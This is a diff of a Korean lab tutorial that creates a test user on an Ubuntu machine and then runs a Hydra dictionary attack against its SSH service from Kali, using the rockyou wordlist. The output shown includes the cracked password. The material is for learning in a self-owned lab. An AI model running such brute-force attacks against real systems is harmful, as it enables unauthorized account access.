@@ -8,17 +8,22 @@
 cju@wooam:~$ sudo adduser aaa
 ```
 
-2. [칼리] Hydra 도구를 사용한 사전 대입 공격
+2. [우분투] IP 주소 확인
 ```
-$ hydra -l aaa -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.202.xxx
-```
-
-3. [칼리] 패스워드가 보인다!
-```
-[22][ssh] host: 192.168.202.128   login: aaa   password: 111111
+cju@wooam:~$ ip a
 ```
 
-4. [칼리] (참고) 사전 파일 확인
+3. [칼리] Hydra 도구를 사용한 사전 대입 공격
+```
+$ hydra -l aaa -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.XXX.xxx
+```
+
+4. [칼리] 패스워드가 보인다!
+```
+[22][ssh] host: 192.168.XXX.XXX   login: aaa   password: 111111
+```
+
+5. [칼리] (참고) 사전 파일 확인
 ```
 $ vi /usr/share/wordlists/rockyou.txt.gz
 ```
